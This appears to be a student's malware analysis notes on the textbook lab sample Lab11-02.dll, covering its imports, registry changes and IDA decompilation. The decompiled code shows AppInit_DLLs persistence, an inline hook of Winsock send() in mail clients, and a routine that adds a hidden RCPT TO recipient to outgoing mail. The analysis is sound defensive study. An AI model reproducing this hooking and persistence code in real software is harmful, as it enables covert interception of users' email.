Lab11-02.dll
    PE Analysis
        # Virustotal
            26/72
            SHA-256: df899256c4a9fc0e550c62b84ab9cb8acd8d18683f0a41c98ba83f0487d4766e

            PEiD packer
                Microsoft Visual C++ v6.0 DLL

            TimeStamp: 2011-11-06 21:50:12

            Subsystem: Windows GUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	2188	4096	3.85	858efe7509fe272e8035ac2f9c3766f9
                .rdata	8192	970	4096	1.55	62500d40687b05c847e8b8dcee897657
                .data	12288	1464	4096	0.72	5c9bc27bad4ac46fc5d0ced904581666
                .reloc	16384	274	4096	0.55	72765c224fac9a651e6a3dbb693b7dbb

            IMPORT
                ADVAPI32.dll
                    RegOpenKeyExA
                    RegSetValueExA
                    RegCloseKey
                KERNEL32.dll
                    CreateToolhelp32Snapshot
                    SuspendThread
                    ResumeThread
                    CreateFileA
                    GetProcAddress
                    GetCurrentProcessId
                    GetModuleHandleA
                    ReadFile
                    LoadLibraryA
                    Thread32Next
                    CopyFileA
                    CloseHandle
                    VirtualProtect
                    GetCurrentThreadId
                    Thread32First
                    GetSystemDirectoryA
                    GetModuleFileNameA

            Exports
                installer

        # strings.exe (Only part of the results)
            RCPT TO: <
            THEBAT.EXE
            THEBAT.EXE
            OUTLOOK.EXE
            OUTLOOK.EXE
            MSIMN.EXE
            MSIMN.EXE
            send
            wsock32.dll
            SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
            spoolvxx32.dll
            spoolvxx32.dll
            AppInit_DLLs
            \spoolvxx32.dll
            \Lab11-02.ini

    Dynamic Analysis
        # RegShot (Part of results)
            ----------------------------------
            Values modified:2
            ----------------------------------
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: E3 A2 1E 49 9E E6 8E DC 00 F5 E9 2C 68 20 4E E0 78 FC 87 0E E4 4C BE 40 23 39 CB 37 42 7C FA DC 62 5F 9E E9 CC 87 40 4A 04 B8 C5 C1 65 7B 44 19 7B 63 E5 78 D6 13 5D 92 DA EE FD A3 FC 1D AC 07 6E FC D9 A1 FF 8C 24 14 0F 62 B2 AB DF 50 8B 6E
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 0B F0 51 E3 EA B8 3D E6 DE B7 1D E6 D7 6B DE 49 4B A9 86 7C 63 BC 99 5D B6 2E 42 34 5B 6B 10 A7 7B C3 1B 5F 4B F7 88 6D 4A A4 A7 37 D7 F2 43 21 BB 8F 16 CC D9 87 D2 B5 D9 A6 4D 7C F2 8D B2 44 0F 73 F3 5F 2D 7D 7A CB 91 3B 4C CD 60 BC 8C 4E
            HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs: ""
            HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs: "spoolvxx32.dll"

            Put Lab11-02.ini in \system32\
                ----------------------------------
                Keys added:3
                ----------------------------------
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\0\1\0\0
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\21
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\21\Shell

                ----------------------------------
                Values added:44
                ----------------------------------
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders\shell:System: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{D6277990-4C6A-11CF-8D87-00AA0060F5BF} {000214E6-0000-0000-C000-000000000046} 0x401: 01 00 00 00 31 00 30 00 40 F6 57 0A 39 1F D6 01
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{F5175861-2688-11D0-9C5E-00AA00A45957} {000214E6-0000-0000-C000-000000000046} 0x401: 01 00 00 00 31 00 30 00 90 A8 62 0A 39 1F D6 01
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{88C6C381-2E85-11D0-94DE-444553540000} {000214E6-0000-0000-C000-000000000046} 0x401: 01 00 00 00 31 00 30 00 10 E2 6E 0A 39 1F D6 01
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\0\1\0\0: 40 00 31 00 00 00 00 00 96 50 CB B9 10 00 73 79 73 74 65 6D 33 32 00 00 28 00 03 00 04 00 EF BE 96 50 D6 90 9E 50 18 AD 14 00 00 00 73 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 00 00 18 00 00 00
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\0\1\0\0\NodeSlot: 0x00000015
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\0\1\0\0\MRUListEx: FF FF FF FF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\MinPos1920x975(1).x: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\MinPos1920x975(1).y: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\MaxPos1920x975(1).x: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\MaxPos1920x975(1).y: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\WinPos1920x975(1).left: 0x0000045A
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\WinPos1920x975(1).top: 0x00000043
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\WinPos1920x975(1).right: 0x0000077A
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\WinPos1920x975(1).bottom: 0x0000029B
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Rev: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\WFlags: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\ShowCmd: 0x00000001
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\FFlags: 0x00000001
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\HotKey: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Buttons: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Links: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Address: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Vid: "{65F125E5-7BE1-4810-BA9D-D271C8432CE3}"
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Mode: 0x00000006
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\ScrollPos1920x975(1).x: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\ScrollPos1920x975(1).y: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Sort: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\SortDir: 0x00000001
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\Col: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\20\Shell\ColInfo: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FD DF DF FD 0F 00 06 00 28 00 10 00 34 00 48 00 00 00 00 00 01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00 B4 00 60 00 78 00 78 00 B4 00 B4 00 00 00 00 00 01 00 00 00 02 00 00 00 03 00 00 00 FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\MinPos1920x975(1).x: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\MinPos1920x975(1).y: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\MaxPos1920x975(1).x: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\MaxPos1920x975(1).y: 0xFFFFFFFF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\WinPos1920x975(1).left: 0x0000045A
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\WinPos1920x975(1).top: 0x00000043
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\WinPos1920x975(1).right: 0x0000077A
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\WinPos1920x975(1).bottom: 0x0000029B
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\ScrollPos1920x975(1).x: 0x00000000
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\8\Shell\ScrollPos1920x975(1).y: 0x00000003
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\Bags\21\Shell\FolderType: "Documents"
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\MUICache\@shell32.dll,-31325: "Hide the contents of this folder"
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\MUICache\@shell32.dll,-31323: "Show the contents of this folder"

                ----------------------------------
                Values modified:4
                ----------------------------------
                HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 0C 36 8D 45 6B 35 5E E2 04 E7 44 5C 0C 9F F0 21 DC 12 13 70 51 60 97 84 AF 2A DB 41 0E DD F1 6F 64 11 9D D2 97 35 60 22 FF FF 1A 33 36 E5 BC A7 6A B8 AD B3 36 AF 33 3E 6E FF 32 13 CA D1 1B 5C 66 E9 A9 FB F9 68 D3 5F 02 A5 35 7A 90 23 47 ED
                HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: B5 48 46 D4 A1 BE 8F 1C 53 01 D2 3E F6 A4 5B 98 05 50 1F 12 16 A2 7F 08 0B 58 21 A0 88 24 A8 C5 57 3C F4 71 6F 39 13 A7 3C AC 5B C7 95 6C 10 D1 29 A9 FD 6E 17 49 98 0F 13 21 3B A0 81 19 0A 9A 45 FB 4A 9B CC 37 46 8C C8 9F 14 DA 84 EB 36 9C
                HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs: ""
                HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs: "spoolvxx32.dll"
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\NodeSlots: 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\NodeSlots: 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\0\1\0\MRUListEx: FF FF FF FF
                HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\ShellNoRoam\BagMRU\0\1\0\MRUListEx: 00 00 00 00 FF FF FF FF

        # procexp (View > Lower Pane View > DLLS / Handles)
            NULL

        # procmon
            Filter
                Process Name is rundll32.exe Include
                Operation is RegSetValue Include
                Operation is WriteFile Include
                Path contains ini Include
        
            Result
                2:44:55.4609886 PM	rundll32.exe	2056	RegSetValue	HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed	SUCCESS	Type: REG_BINARY, Length: 80, Data: AA E8 C6 E5 78 4B 62 04 73 A8 68 D3 C5 40 6E 1C
                2:44:55.6342296 PM	rundll32.exe	2056	RegSetValue	HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs	SUCCESS	Type: REG_SZ, Length: 30, Data: spoolvxx32.dll
                2:44:55.6415191 PM	rundll32.exe	2056	WriteFile	C:\WINDOWS\system32\spoolvxx32.dll	SUCCESS	Offset: 0, Length: 20,480           // As same as Lab11-02.dll
                2:44:55.7895643 PM	rundll32.exe	1036	CreateFile	C:\WINDOWS\system32\Lab11-02.ini	NAME NOT FOUND	Desired Access: Generic Read, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: N, ShareMode: Read, AllocationSize: n/a                         // Need to put it under /system32/

        # autoruns
            NULL

        # ApateDNS
            NULL
        
        # sc
            NULL

        # IDA Pro
            BOOL installer()                // Set reg value in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs; Copy itself to \system32\spoolvxx32.dll
            {
            if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 6u, &phkResult) )// HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
            {
                len = strlen(spoolvxx32_dll);
                RegSetValueExA(phkResult, AppInit_DLLs, 0, 1u, Data, len);
                RegCloseKey(phkResult);
            }
            Dest = SystemDirectory();                        // \system32\
            strncat(Dest, aSpoolvxx32Dll_1, 0x104u);      // \spoolvxx32.dll
            return CopyFileA(ExistingFileName, Dest, 0);
            }

            BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
            {
            result = (BOOL)hinstDLL;
            dword_100035A4 = (int)hinstDLL;
            if ( fdwReason == 1 )
            {
                GetModuleFileNameA(hinstDLL, ExistingFileName, 0x104u);
                memset(byte_100034A0, 0, 0x101u);
                Dest = SystemDirectory();
                strncat(Dest, aLab1102Ini, 0x104u);         // \\Lab11-02.ini
                result = (BOOL)CreateFileA(Dest, 0x80000000, 1u, 0, 3u, 0x80u, 0);
                Lab11_02_ini_handler = (HANDLE)result;
                if ( result != -1 )
                {
                NumberOfBytesRead = 0;
                ReadFile(Lab11_02_ini_handler, byte_100034A0, 0x100u, &NumberOfBytesRead, 0);
                if ( NumberOfBytesRead )
                {
                    byte_100034A0[NumberOfBytesRead] = 0;
                    sub_100010B3(byte_100034A0);                // ?decoder
                }
                CloseHandle(Lab11_02_ini_handler);
                result = sub_100014B6(1);                       // ?
                }
            }
            return result;
            }

            Copy Lab11-02.dll as spoolvxx32.dll in \system32\ and move Lab11-02.ini in \system32\
            OllyDbg > spoolvxx32.dll > F2 100016CA > F9 F8
            EAX 100034A0 ASCII "billy@malwareanalysisbook.com"

            void __cdecl sub_100014B6(int a1)           // It's a function used to find target proc.
            {
            Buf1 = v1;
            if ( a1 )
            {
                GetModuleFileName(0, (int)&Buf1);           // hModule=0, return current DLL image path
                Buf1 = get_last_filename_inpath((char *)Buf1);
                if ( Buf1 )
                {
                Upper(Buf1);
                v2 = strlen(THEBAT_EXE);
                if ( !memcmp(Buf1, THEBAT_EXE_0, v2)      // AppInit_DLLs will be added into all process in the system
                    || (v3 = strlen(OUTLOOK_EXE), !memcmp(Buf1, OUTLOOK_EXE_0, v3))
                    || (v4 = strlen(MSIMN_EXE), !memcmp(Buf1, MSIMN_EXE_0, v4)) )
                {
                    Suspend_allThreads_ofl_current_process();
                    sub_100012A3(wsock32_dll, send, (int)sub_1000113D, (int)&dword_10003484);           // ?Inline hook
                    Resume_all_suspended_Threads();
                }
                }
            }
            }

            int __cdecl sub_10001203(LPVOID send_addr, int sub_1000113D_addr, int a3)
            {
            v7 = sub_1000113D_addr - (_DWORD)send_addr - 5;             // compute the offset between first 5bytes of send() and sub_1000113D_addr
            VirtualProtect(send_addr, 5u, 0x40u, &flOldProtect);        // modify the execution of send() in the start addr of send()
            new_space = malloc(0xFFu);                                  
            new_space_0 = new_space;
            *new_space = send_addr;                                     // fill original 5bytes of send() from the start addr of send()
            *((_BYTE *)new_space_0 + 4) = 5;                            // fill the first 4byte with the send_addr in the new malloced space
            memcpy((char *)v6 + 5, send_addr, 5u);                      // copy the 5bytes of send() into the 5th byte of new space
            *((_BYTE *)v6 + 10) = 0xE9;                                 // copy the JMP instructor from the 10th byte of new space
            *(_DWORD *)((char *)v6 + 11) = (_BYTE *)send_addr - (_BYTE *)v6 - 10;       // fill in offset from the 11th byte of new space
            *(_BYTE *)send_addr = 0xE9;                                 // modify the 0th byte of send as JMP instructor
            *(_DWORD *)((char *)send_addr + 1) = v7;                    // modify as the addr of jmp
            VirtualProtect(send_addr, 5u, flOldProtect, &flOldProtect);// restore the original of send()
            result = a3;
            *(_DWORD *)a3 = (char *)v6 + 5;
            return result;
            }

            int __stdcall sub_1000113D(int a1, char *Str, int a3, int a4)
            {
            if ( strstr(Str, RCPT_TO) )
            {
                v4 = strlen(RCPT_TO_left);
                memcpy(Dst, RCPT_TO_left_0, v4);
                v5 = strlen(RCPT_TO_left_1);
                memcpy(&Dst[v5], email_addr, 0x101u);           // RCP_TO: <email.addr>\r\n
                strcat(Dst, Source);
                v6 = strlen(Dst);
                dword_10003484(a1, Dst, v6, a4);                // callback send
            }
            return dword_10003484(a1, Str, a3, a4);
            }

            OllyDbg > File > attack > msimn.exe
                View > Memory map
                    Memory map, item 160
                    Address = 10000000
                    Size = 00001000 (4096.)
                    Owner = spoolvxx32      10000000 (self)     // !
                    Section =
                    Contains = PE header
                    Type = Img  01001002
                    Access = R
                    Initial access = RWE CopyOnWr
                    Mapped as =
                Ctrl+G > send > discover the hooked send() in ws2_32.dll
                    EBX 01CEF240 ASCII "HELO malware"

Lab11-02.ini
    PE Analysis
        # Virustotal
            0/59
            SHA-256: 0493c7167ae07704ed41fe4d43333165f3167aca8547b6f1d2c67592eccc6fa2

            First Seen in the wild: 2011-11-06 11:03:20

        # strings.exe
            CHMMXaL@MV@SD@O@MXRHRCNNJ
            BNL

Analysis
    The malware copy itself as spoolvxx32.dll in \system32\ and read \system32\Lab11-02.ini and decode the content to an email address: billy@malwareanalysisbook.com.
    Then it makes an inline hook in send() of ws2_32.dll like the following:

                    ws2_32.dll send()                                           ws2_32.dll send()
    call send() ->  +----------+                inline hook   call send() ->    +----------+        +--------------+
                    |          |                                                |   jmp    | -----> |malicious code|
                    |  send()  |                                                +----------+        +--------------+
                    |          |                                                |  send()  | <----- | start send() |
                    +----------+                                                +----------+        +--------------+

    Additional dynamic analysis:
        1. install Outlook Express;
        2. python -m smtpd -n -c DebuggingServer 10.0.0.1:25
        3. Start wireshark and capture the traffic
        4. Send to 10.0.0.1 from the vm
            220 osboxes Python SMTP proxy version 0.2
            HELO malware
            250 osboxes
